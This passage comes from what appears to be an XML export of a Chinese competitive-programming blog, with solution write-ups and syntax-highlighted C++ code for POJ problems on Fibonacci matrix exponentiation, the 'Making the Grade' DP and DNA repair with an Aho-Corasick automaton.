class="number">3</span>][<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">prepare</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;w, &amp;h) != EOF) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="built_in">SG</span>(w, h) ? <span class="string">&quot;WIN&quot;</span> : <span class="string">&quot;LOSE&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>博弈论</tag>
        <tag>SG 函数</tag>
        <tag>POJ</tag>
      </tags>
  </entry>
  <entry>
    <title>「POJ 3070」Fibonacci - 矩阵乘法</title>
    <url>/poj-3070/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="http://poj.org/problem?id=3070">POJ 链接</a></p>
<p>给定一个数 <span class="math inline">\(n\)</span>，求斐波那契数列第
<span class="math inline">\(n\)</span> 项的后四位。</p>
<p>数据范围：<span class="math inline">\(1 \leq n \leq 10^9\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>我们可以使用矩阵来加速地推。</p>
<p>我们知道斐波那契的通项公式为：</p>
<p><span class="math display">\[
a_i = a_{i - 1} + a_{i - 2}
\]</span></p>
<p>故我们可以设矩阵 <span class="math inline">\(F(n)\)</span>：</p>
<p><span class="math display">\[
F(n) =
\begin{bmatrix}
a_n &amp; a_{n + 1}
\end{bmatrix}
\]</span></p>
<p>同时我们可以设：</p>
<p><span class="math display">\[
F(n) = F(n - 1) \times X
\]</span></p>
<p>即为：</p>
<p><span class="math display">\[
\begin{bmatrix}
a_n &amp; a_{n + 1}
\end{bmatrix} =
\begin{bmatrix}
a_{n - 1} &amp; a_n
\end{bmatrix} \times X
\]</span></p>
<p>我们可以推出：</p>
<p><span class="math display">\[
\begin{bmatrix}
a_n &amp; a_{n + 1}
\end{bmatrix} =
\begin{bmatrix}
a_{n - 1} &amp; a_n
\end{bmatrix} \times
\begin{bmatrix}
0 &amp; 1 \\
1 &amp; 1
\end{bmatrix}
\]</span></p>
<p>所以我们最终可以推出下列式子：</p>
<p><span class="math display">\[
F(n) = F(1) \times
\begin{bmatrix}
0 &amp; 1 \\
1 &amp; 1
\end{bmatrix} ^ {n - 1} =
\begin{bmatrix}
1 &amp; 1
\end{bmatrix} \times
\begin{bmatrix}
0 &amp; 1 \\
1 &amp; 1
\end{bmatrix} ^ {n - 1}
\]</span></p>
<p>最终利用快速幂就可以在 <span class="math inline">\(O(\log n)\)</span>
的时间复杂度中求出答案。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fib[<span class="number">1</span> + <span class="number">1</span>][<span class="number">2</span> + <span class="number">1</span>], x[<span class="number">2</span> + <span class="number">1</span>][<span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    fib[<span class="number">1</span>][<span class="number">1</span>] = fib[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    x[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    x[<span class="number">1</span>][<span class="number">2</span>] = x[<span class="number">2</span>][<span class="number">1</span>] = x[<span class="number">2</span>][<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mul</span><span class="params">(<span class="type">int</span> a[][<span class="number">2</span> + <span class="number">1</span>], <span class="type">int</span> ax, <span class="type">int</span> ay, <span class="type">int</span> b[][<span class="number">2</span> + <span class="number">1</span>], <span class="type">int</span> bx, <span class="type">int</span> by, <span class="type">int</span> ans[][<span class="number">2</span> + <span class="number">1</span>], <span class="type">int</span> mod)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> s1[<span class="number">2</span> + <span class="number">1</span>][<span class="number">2</span> + <span class="number">1</span>], s2[<span class="number">2</span> + <span class="number">1</span>][<span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(s1, a, <span class="built_in">sizeof</span>(<span class="type">int</span>) * (ax + <span class="number">1</span>) * (ay + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">memcpy</span>(s2, b, <span class="built_in">sizeof</span>(<span class="type">int</span>) * (bx + <span class="number">1</span>) * (by + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= ax; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= by; j++) &#123;</span><br><span class="line">            <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= ay; k++) sum = (sum + s1[i][k] * s2[k][j]) % mod;</span><br><span class="line">            ans[i][j] = sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pow</span><span class="params">(<span class="type">int</span> a[][<span class="number">2</span> + <span class="number">1</span>], <span class="type">int</span> ax, <span class="type">int</span> ay, <span class="type">int</span> p, <span class="type">int</span> ans[][<span class="number">2</span> + <span class="number">1</span>], <span class="type">int</span> mod)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> s1[<span class="number">2</span> + <span class="number">1</span>][<span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(s1, a, <span class="built_in">sizeof</span>(<span class="type">int</span>) * (<span class="number">2</span> + <span class="number">1</span>) * (<span class="number">2</span> + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="built_in">sizeof</span>(<span class="type">int</span>) * (<span class="number">2</span> + <span class="number">1</span>) * (<span class="number">2</span> + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= std::<span class="built_in">min</span>(ax, ay); i++) ans[i][i] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; p; p &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p &amp; <span class="number">1</span>) <span class="built_in">mul</span>(ans, <span class="number">2</span>, <span class="number">2</span>, s1, <span class="number">2</span>, <span class="number">2</span>, ans, mod);</span><br><span class="line">        <span class="built_in">mul</span>(s1, <span class="number">2</span>, <span class="number">2</span>, s1, <span class="number">2</span>, <span class="number">2</span>, s1, mod);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n) != EOF) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span> || n == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;2\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">init</span>();</span><br><span class="line">        <span class="built_in">pow</span>(x, <span class="number">2</span>, <span class="number">2</span>, n - <span class="number">1</span>, x, <span class="number">10000</span>);</span><br><span class="line">        <span class="built_in">mul</span>(fib, <span class="number">1</span>, <span class="number">2</span>, x, <span class="number">2</span>, <span class="number">2</span>, fib, <span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, fib[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>矩阵乘法</tag>
        <tag>POJ</tag>
      </tags>
  </entry>
  <entry>
    <title>「POJ 3666」Making the Grade - 线性 DP</title>
    <url>/poj-3666/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="http://poj.org/problem?id=3666">POJ 链接</a></p>
<p>给定一个长度为 <span class="math inline">\(N\)</span> 的序列 <span
class="math inline">\(A\)</span>，要求构造一个长度为 <span
class="math inline">\(N\)</span> 的序列 <span
class="math inline">\(B\)</span>。<span class="math inline">\(B\)</span>
满足以下条件：</p>
<ol type="1">
<li><p><span class="math inline">\(B\)</span>
非严格单调（单调递增或单调递减都可），</p></li>
<li><p>在满足 <span class="math inline">\(1\)</span> 的条件下，使 <span
class="math inline">\(S = \sum_{i = 1}^{N} | A_i - B_i
|\)</span>。</p></li>
</ol>
<p>仅需求出最小值 <span class="math inline">\(S\)</span>
即可。题目数据满足 <span class="math inline">\(1 \leq N \leq
2000\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>首先我们讨论 <span class="math inline">\(B\)</span>
为非严格单调序列。非严格单调递减同理。两者取最小值即使答案。</p>
<h2 id="构造处理">构造处理</h2>
<p>首先我们提出一个猜想：至少有一种构造方法，满足在 <span
class="math inline">\(S\)</span> 最小的情况下，使 <span
class="math inline">\(B\)</span> 中所有数字均在 <span
class="math inline">\(A\)</span> 中出现过。</p>
<p>这个猜想可以用数学归纳法进行证明：</p>
<ol type="1">
<li><p>显然在 <span class="math inline">\(N = 1\)</span>
的时候该结论成立。</p></li>
<li><p>设该猜想对于 <span class="math inline">\(N = x - 1\)</span>
时成立，则对于 <span class="math inline">\(N =
x\)</span>，分为一下情况：</p>
<ul>
<li><p><span class="math inline">\(B_{x - 1} \leq A_x\)</span>，显然
<span class="math inline">\(B_{x} = A_x\)</span> 的时候 <span
class="math inline">\(S\)</span> 最小。</p></li>
<li><p><span class="math inline">\(B_{x - 1} &gt; A_x\)</span>，可令
<span class="math inline">\(B_x = B_{x - 1}\)</span>，或者寻找一个值
<span class="math inline">\(y\)</span>，将 <span
class="math inline">\(B_y, B_{y + 1}, B_{y + 2}, \cdots, B_x\)</span>
赋值为同一个数 <span class="math inline">\(z\)</span>。令 <span
class="math inline">\(A\)</span> 的中位数为 <span
class="math inline">\(mid\)</span>，若 <span class="math inline">\(mid
&lt; B_{y - 1}\)</span>，则 <span class="math inline">\(z = B_{y -
1}\)</span>，否则 <span class="math inline">\(z =
mid\)</span>。从中位数性质易得该结论。</p></li>
</ul></li>
</ol>
<h2 id="动态规划">动态规划</h2>
<p>接下来即可进行动态规划。令排序过的 <span
class="math inline">\(A\)</span> 为 <span
class="math inline">\(S\)</span>，我们可以设数组 <span
class="math inline">\(f_{i, j}\)</span>，其中 <span
class="math inline">\(i\)</span> 表示目标是求 <span
class="math inline">\(B\)</span> 的第 <span
class="math inline">\(i\)</span> 项，<span
class="math inline">\(j\)</span> 表示 <span class="math inline">\(B_i =
S_j\)</span> 的情况。<span class="math inline">\(f_{i, j}\)</span>
的值表示 <span class="math inline">\(A\)</span> 在 <span
class="math inline">\(i\)</span> 及之前的序列在使用 <span
class="math inline">\(S\)</span> 在 <span
class="math inline">\(j\)</span> 及以前的序列的数的情况下 <span
class="math inline">\(S\)</span>
的最小值。我们可以推出下列状态转移方程：</p>
<p><span class="math display">\[
f_{i, j} = \min \limits_{1 \leq k \leq j} \{ f_{i - 1, k} + |A_i - S_j|
\}
\]</span></p>
<p>初始状态为 <span class="math inline">\(f = INF\)</span>，目标所求为
<span class="math inline">\(\min \limits_{1 \leq i \leq n} f_{n,
i}\)</span>。</p>
<p>由于状态转移方程中 <span class="math inline">\(f_{i - 1, k}\)</span>
的最小值滚动时只会受到最后一个数的影响，我们可以将前一个最小值存起来，更新时仅比较前一个最小值和
<span class="math inline">\(f_{i - 1, k}\)</span>。可以将时间复杂度从
<span class="math inline">\(O(n^3)\)</span> 优化到 <span
class="math inline">\(O(n^2)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">2000</span>, INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对单调递增的处理</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fG[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>], s[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fG, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(fG));</span><br><span class="line">    <span class="built_in">memcpy</span>(s, a, <span class="built_in">sizeof</span>(a));</span><br><span class="line">    std::<span class="built_in">sort</span>(s + <span class="number">1</span>, s + n + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) fG[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            fG[i][<span class="number">0</span>] = std::<span class="built_in">min</span>(fG[i][<span class="number">0</span>], fG[i - <span class="number">1</span>][j]);</span><br><span class="line">            fG[i][j] = fG[i][<span class="number">0</span>] + <span class="built_in">abs</span>(a[i] - s[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对单调递减的处理</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fL[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fL, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(fG));</span><br><span class="line">    <span class="built_in">memcpy</span>(s, a, <span class="built_in">sizeof</span>(a));</span><br><span class="line">    std::<span class="built_in">sort</span>(s + <span class="number">1</span>, s + n + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) fL[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            fL[i][<span class="number">0</span>] = std::<span class="built_in">min</span>(fL[i][<span class="number">0</span>], fL[i - <span class="number">1</span>][j]);</span><br><span class="line">            fL[i][j] = fL[i][<span class="number">0</span>] + <span class="built_in">abs</span>(a[i] - s[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ans = INF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fG[n][i] &lt; ans) ans = fG[n][i];</span><br><span class="line">        <span class="keyword">if</span> (fL[n][i] &lt; ans) ans = fL[n][i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; ans &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>USACO</tag>
        <tag>线性 DP</tag>
        <tag>POJ</tag>
      </tags>
  </entry>
  <entry>
    <title>「POJ 3691」DNA repair - AC 自动机 + DP</title>
    <url>/poj-3691/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="http://poj.org/problem?id=3691">POJ 链接</a></p>
<p>生物学家终于发明了修复 DNA
的技术，能够将包含各种遗传疾病的DNA片段进行修复。</p>
<p>为了简单起见，DNA 看作是一个由
<code>A</code>、<code>G</code>、<code>C</code>、<code>T</code>
构成的字符串。</p>
<p>修复技术就是通过改变字符串中的一些字符，从而消除字符串中包含的致病片段。</p>
<p>例如，我们可以通过改变两个字符，将 DNA 片段 <code>AAGCAG</code> 变为
<code>AGGCAC</code>，从而使得 DNA 片段中不再包含致病片段
<code>AAG</code>、<code>AGC</code>、<code>CAG</code>，以达到修复该DNA片段的目的。</p>
<p>需注意，被修复的 DNA 片段中，仍然只能包含字符
<code>A</code>、<code>G</code>、<code>C</code>、<code>T</code>。</p>
<p>请你帮助生物学家修复给定的 DNA
片段，并且修复过程中改变的字符数量要尽可能的少。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题存在多个字符串的匹配问题，可以考虑使用 AC
自动机解决。我们可以先将所有的致病片段都插入 AC
自动机中，并将致病基因字符串作标记。注意如果一个字符串的子串是致病基因，则这个字符串必为致病基因。故构建
AC 自动机时需要看 <code>fail</code>
所指的字符串是否为致病基因，然后更新该节点的信息。即
<code>c-&gt;isWord |= c-&gt;fail-&gt;isWord</code>。</p>
<p>接下来我们需要求解问题。由于求的是最小修改次数，可考虑 DP
解决。由于可使用 AC 自动机匹配是否有子串为致病基因，我们可以考虑以 AC
自动机匹配时的状态为维度进行 DP。</p>
<p>对于需要修复的 DNA 片段 <span
class="math inline">\(s\)</span>，我们可定义 <span
class="math inline">\(f_{i, j}\)</span> 为遍历到 <span
class="math inline">\(s_i\)</span>，且达到位于 AC 自动机 <span
class="math inline">\(j\)</span> 节点的状态时需要最小修改次数。对于可从
<span class="math inline">\(j\)</span> 到达的状态 <span
class="math inline">\(k\)</span>，我们设 <span
class="math inline">\(l\)</span> 为 <span
class="math inline">\(k\)</span>
所在的字符。设属于致病基因的字符串所代表的节点的集合为 <span
class="math inline">\(\text{Disease}\)</span>，于是有下列转移方程：</p>
<p><span class="math display">\[
f_{i + 1, k} = \begin{cases}
\min\{ f_{i + 1, k}, f_{i, j} + [s_{i + 1} = l] \} &amp; k \notin
\text{Disaese} \\
\infty &amp; k \in \text{Disease}
\end{cases}
\]</span></p>
<p>接下来我们只需要初始化 <span class="math inline">\(f_{i, j} =
\begin{cases}
0 &amp; i = 0 \wedge j = \text{root} \\
\infty &amp; otherwise.
\end{cases}\)</span>，然后求解即可。设 AC 自动机中所有点的集合为 <span
class="math inline">\(\text{AC}\)</span>，最终答案则为 <span
class="math inline">\(\min\limits_{i \in \text{AC}}{f_{m,
i}}\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<p>由于这里需要枚举 AC 自动机中的所有节点，故使用内存池编写。</p>
<p><del>POJ 不支持 C++11 真 TM 烦</del></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;new&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1000</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> CHARSET_SIZE = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">const</span> <span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;A&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;G&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;C&#x27;</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Trie</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="type">int</span> id;</span><br><span class="line">        Node *c[CHARSET_SIZE], *fail;</span><br><span class="line">        <span class="type">bool</span> isWord;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Node</span>(<span class="type">bool</span> isWord = <span class="literal">false</span>) : <span class="built_in">fail</span>(<span class="literal">NULL</span>), <span class="built_in">isWord</span>(isWord) &#123; </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CHARSET_SIZE; i++) c[i] = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Node</span>(<span class="type">int</span> id, <span class="type">bool</span> isWord = <span class="literal">false</span>) : <span class="built_in">id</span>(id), <span class="built_in">fail</span>(<span class="literal">NULL</span>), <span class="built_in">isWord</span>(isWord) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CHARSET_SIZE; i++) c[i] = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; *root, _pool[MAXN + <span class="number">1</span>], *_curr;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Trie</span>() : <span class="built_in">root</span>(_pool), _curr(_pool + <span class="number">1</span>), <span class="built_in">idx</span>(<span class="number">0</span>) &#123; root-&gt;id = <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Node *<span class="title">insert</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *begin, <span class="type">const</span> <span class="type">char</span> *end)</span> </span>&#123;</span><br><span class="line">        Node **v = &amp;root;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="type">char</span> *p = begin; p != end; p++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!*v) *v = <span class="built_in">new</span> (_curr++) <span class="built_in">Node</span>(++idx);</span><br><span class="line">            v = &amp;(*v)-&gt;c[<span class="built_in">get</span>(*p)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!*v) *v = <span class="built_in">new</span> (_curr++) <span class="built_in">Node</span>(++idx);</span><br><span class="line">        (*v)-&gt;isWord = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> *v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::queue&lt;Node *&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        root-&gt;fail = root;</span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            Node *v = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CHARSET_SIZE; i++) &#123;</span><br><span class="line">                Node *&amp;c = v-&gt;c[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!c) &#123;</span><br><span class="line">                    c = v == root ? root : v-&gt;fail-&gt;c[i];</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Node *u = v-&gt;fail;</span><br><span class="line"></span><br><span class="line">                c-&gt;fail = v != root &amp;&amp; u-&gt;c[i] ? u-&gt;c[i] : root;</span><br><span class="line"></span><br><span class="line">                q.<span class="built_in">push</span>(c);</span><br><span class="line"></span><br><span class="line">                c-&gt;isWord |= c-&gt;fail-&gt;isWord;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, counts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n) != EOF &amp;&amp; n) &#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> s[MAXN + <span class="number">1</span>];</span><br><span class="line">        Trie t;</span><br><span class="line">        <span class="function">std::vector&lt;Trie::Node *&gt; <span class="title">node</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">            node[i] = t.<span class="built_in">insert</span>(s, s + <span class="built_in">strlen</span>(s));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        t.<span class="built_in">build</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">        <span class="type">int</span> m = <span class="built_in">strlen</span>(s);</span><br><span class="line"></span><br><span class="line">        std::vector&lt; std::vector&lt;<span class="type">int</span>&gt; &gt; <span class="built_in">f</span>(m + <span class="number">1</span>, std::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(t.idx + <span class="number">1</span>, INT_MAX));</span><br><span class="line">        f[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= t.idx; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (f[i][j] != INT_MAX) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; CHARSET_SIZE; k++) &#123;</span><br><span class="line">                        <span class="type">int</span> l = <span class="built_in">get</span>(s[i]) != k;</span><br><span class="line">                        Trie::Node *p = t._pool[j].c[k];</span><br><span class="line">                        <span class="keyword">if</span> (!p-&gt;isWord) f[i + <span class="number">1</span>][p-&gt;id] = std::<span class="built_in">min</span>(f[i + <span class="number">1</span>][p-&gt;id], f[i][j] 